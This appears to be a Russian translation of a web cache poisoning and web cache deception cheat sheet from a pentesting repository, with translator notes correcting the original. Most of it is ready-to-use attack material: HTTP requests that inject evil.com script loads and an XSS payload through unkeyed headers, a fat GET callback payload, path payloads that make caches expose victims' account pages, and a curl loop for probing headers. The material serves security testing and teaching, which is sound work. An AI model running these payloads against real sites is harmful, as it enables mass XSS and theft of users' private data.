<a id="-web-cache-poisoning-cheatsheet"></a>
# 💾 Справочник по отравлению веб-кеша

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

<a id="-what-is-cache-poisoning"></a>
## 🎯 Что такое отравление кеша

> **Уточнение к оригиналу.** По [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning), нужны и небезопасная обработка входных данных, и сохранение ответа, который затем получают другие пользователи. Одно отражение заголовка или признак HIT этого не доказывают; последствия зависят от конкретного ответа и охвата кеша.


**Отравление веб-кеша (Web Cache Poisoning)** использует особенности кеширования: вредоносный ответ сохраняется в кеше и затем выдаётся другим пользователям.

<a id="impact"></a>
### Последствия
- 🔴 **Массовая XSS** — выдача сохранённого XSS-содержимого пользователям
- 🔴 **Подмена содержимого** — сохранение вредоносного содержимого в кеше
- 🔴 **Отказ в обслуживании (DoS)** — кеширование ответов с ошибками
- 🔴 **Атаки с перенаправлением** — перенаправление пользователей

---

<a id="-understanding-caching"></a>
## 🔍 Как работает кеширование

<a id="cache-keys"></a>
### Ключи кеша

> **Уточнение.** Это упрощённая схема, а не универсальный список unkeyed-заголовков. [RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html#section-2) учитывает метод, URI и дополнительные поля, в том числе через Vary. Реальный ключ зависит от конфигурации; curl -I запрашивает HEAD и не подтверждает поведение тела GET-ответа.

```
# Обычно ключ строится из:
URL + заголовок Host

# Не входят в ключ (unkeyed) в этом примере:
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Пользовательские заголовки
```

<a id="detect-caching"></a>
### Обнаружение кеширования
```bash
# Ищите заголовки кеширования
curl -I https://target.com

# Признаки кеширования:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

<a id="-unkeyed-header-injection"></a>
## 💉 Внедрение через заголовки, не входящие в ключ кеша

<a id="x-forwarded-host"></a>
### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Если ответ отражает evil.com:
<script src="//evil.com/malicious.js">
```

<a id="x-forwarded-scheme"></a>
### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Может вызвать перенаправление или путаницу протоколов
Location: http://target.com/
```

<a id="x-host"></a>
### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Проверьте отражение значения в ответе
```

<a id="x-original-url--x-rewrite-url"></a>
### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Обход ограничений пути
```

---

<a id="-attack-techniques"></a>
## 🔥 Способы атаки

<a id="basic-cache-poisoning-xss"></a>
### Базовый пример XSS через отравление кеша
```http
# 1. Найдите входные данные, не входящие в ключ и отражаемые в ответе
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. Ответ с XSS сохраняется в кеше
# 3. Пользователи получают XSS из кеша
```

<a id="cache-poisoning-via-path"></a>
### Отравление кеша через путь
```http
# Запрос с отличающимся путём к исходному серверу
GET /page;evil HTTP/1.1
Host: target.com

# Ответ может кешироваться с неожиданным ключом
```

<a id="fat-get-requests"></a>
### Запросы GET с телом (Fat GET)

> **Уточнение к примеру.** [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.1) не задаёт общей семантики для тела GET. В иллюстрации Content-Length: 25 не соответствует показанному телу; переносы строк и фактические байты также важны. Исходный фрагмент сохранён дословно.

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Тело может влиять на ответ, но не на ключ кеша
```

<a id="parameter-cloaking"></a>
### Маскировка параметров (Parameter Cloaking)
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Кеш и приложение могут разбирать параметры по-разному
```

---

<a id="-web-cache-deception"></a>
## 🛠️ Обман веб-кеша (Web Cache Deception)

<a id="different-from-poisoning"></a>
### Отличие от отравления кеша
```
# Poisoning: полезная нагрузка атакующего кешируется для жертв
# Deception: данные жертвы кешируются и становятся доступны атакующему

# Этапы Web Cache Deception:
1. Заставить жертву открыть: /account/settings.css
2. Сервер возвращает /account/settings (игнорируя .css)
3. Кеш сохраняет ответ как общедоступный ресурс
4. Атакующий запрашивает /account/settings.css из кеша
5. Получает конфиденциальные данные жертвы
```

<a id="payloads"></a>
### Полезные нагрузки
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

<a id="-cache-buster-technique"></a>
## 📊 Приём с уникальным ключом кеша (Cache Buster)

<a id="for-testing"></a>
### Для тестирования

> **Уточнение.** Параметр cb изолирует проверку только если он действительно входит в ключ кеша. [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning) рекомендует проверять это свойство, а не считать любой случайный параметр гарантией отдельной записи.

```http
# Добавьте cache buster для изоляции проверки от других пользователей
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Каждая проверка получает уникальный ключ кеша (предположение оригинала)
```

---

<a id="-tools"></a>
## 🛠️ Инструменты

<a id="param-miner-burp-extension"></a>
### Param Miner (расширение Burp)
```
1. Установить Param Miner из BApp Store
2. Щёлкнуть запрос правой кнопкой мыши → Extensions → Param Miner
3. Выбрать "Guess headers" (подобрать заголовки)
4. Проверить заголовки, не входящие в ключ кеша
```

<a id="manual-testing"></a>
### Ручная проверка
```bash
# Проверить заголовки
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

<a id="-common-unkeyed-headers"></a>
## 📋 Распространённые заголовки, не входящие в ключ кеша

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Отравление веб-кеша: PortSwigger](https://portswigger.net/web-security/web-cache-poisoning)
- [Исследование PortSwigger](https://portswigger.net/research/practical-web-cache-poisoning)
- [Обман веб-кеша (Web Cache Deception)](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Исследуйте отравление кеша!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
